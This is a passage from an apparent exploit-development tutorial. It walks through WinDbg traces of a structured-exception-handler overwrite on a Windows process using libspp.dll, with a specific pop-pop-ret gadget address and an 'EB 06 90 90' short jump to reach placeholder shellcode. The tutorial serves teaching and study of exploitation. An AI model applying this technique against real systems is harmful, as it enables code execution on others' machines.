</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df440 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> r
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df440 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f1 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df444 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16461</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df540 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f2 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df448 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16462</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Now the next step will be a &ldquo;ret&rdquo;, which will return the instruction flow to what the top of the stack has. Let&rsquo;s see the top of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dd <span style="color:#a6e22e">poi</span>(esp)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff44  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff54  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff64  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff74  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff84  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff94  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dffa4  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dffb4  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>After executing the ret instruction, we will point to 008dff44, which is at the start of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure. That structure had 41414141 as the &ldquo;Next&rdquo; member address, and the &ldquo;Handler&rdquo; address. The next is our shellcode.</p>
<p>The bad thing is that right now we don&rsquo;t exactly land on our shellcode.
We land on the following instructions:</p>
<ul>
<li>41 41 41 41 (or whatever we put in our buffer)</li>
<li>4 bytes corresponding of the pop, pop, ret address we used</li>
<li>Our shellcode.</li>
</ul>
<p>If we analyze the instructions, we see that the &ldquo;pop, pop, ret&rdquo; address is malformed and takes 2 more bytes, resulting in another instruction when executed as code instead of an address.
Because this instruction uses part of our buffer as a destination adress, and this address is not mapped, this will trigger an access violation and break our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>But remember we have 4 bytes corresponding to the &ldquo;Next&rdquo; parameter that right now are 41 41 41 41.
We can replace those bytes with an instruction that will jump to our shellcode, skipping the four bytes of the pop, pop, ret memory address which cause problems.
This is known as a &ldquo;short jump&rdquo; in assembly, also known as a short relative jump.
The first opcode of the short jump is 0xEB and the second opcode is the offset in bytes.
The offset in bytes is 0x00 to 0x7F for forward short jumps, and 0x80 to 0xFF to backwards short jumps.</p>
<p>Let&rsquo;s see the formula of the short jump:
<code>JMP Address + 2 + Second_Byte_value = Next_Instruction_Address</code></p>
<p>It&rsquo;s basically a JMP (EB) + 2 bytes + the offset in bytes we want to jump.  Here are some examples:</p>
<table>
  <thead>
      <tr>
          <th><strong>Address  Code</strong></th>
          <th><strong>Instruction</strong></th>
          <th><strong>Formula Examples</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>0100   EB 03</strong></td>
          <td><strong>JMP  0105</strong></td>
          <td><strong>100h + 2 + 03h = 105h</strong></td>
      </tr>
      <tr>
          <td><strong>0152   EB 23</strong></td>
          <td><strong>JMP  0177</strong></td>
          <td><strong>152h + 2 + 23h = 177h</strong></td>
      </tr>
      <tr>
          <td><strong>0173   EB 47</strong></td>
          <td><strong>JMP  01BC</strong></td>
          <td><strong>173h + 2 + 47h = 1BCh</strong></td>
      </tr>
      <tr>
          <td><strong>0200   EB 7F</strong></td>
          <td><strong>JMP  0281</strong></td>
          <td><strong>200h + 2 + 7Fh = 281h</strong></td>
      </tr>
  </tbody>
</table>
<p>In the previous example, we want to jump to 0091ff4c, which is the start of our shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>We can replace the instruction in 0091ff44 to a &ldquo;jmp 0x0091ff4c&rdquo;.
We can do this in WinGdb with the &ldquo;a&rdquo; command, replacing the actual EIP for our instruction, like live patching:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> jmp <span style="color:#ae81ff">0x0091ff4c</span>
</span></span><span style="display:flex;"><span>jmp <span style="color:#ae81ff">0x0091ff4c</span>
</span></span></code></pre></div><p>Let&rsquo;s inspect how the debugger translated such JMP instruction, and confirm it&rsquo;s a short jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>It&rsquo;s a EB06, meaning that it jumps 4 bytes offset (remember that was EB + 02 bytes + offset bytes).
Exactly, it&rsquo;s skipping the 4 bytes corresponding to the pop, pop, ret instruction at 0091ff48!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">414106</span>eb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>Instead of 41414141, we have to insert eb069090 (2 nops at the end). Remember that we have to insert them in little endian. But as they are nops, we can do 90 90 eb 06, or eb 06 90 90.</p>
<p>Replacing this in our payload leads us to now doing a NOP, NOP, and the relative jump to our code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f2 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">448</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16462</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">44</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">45</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">46</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
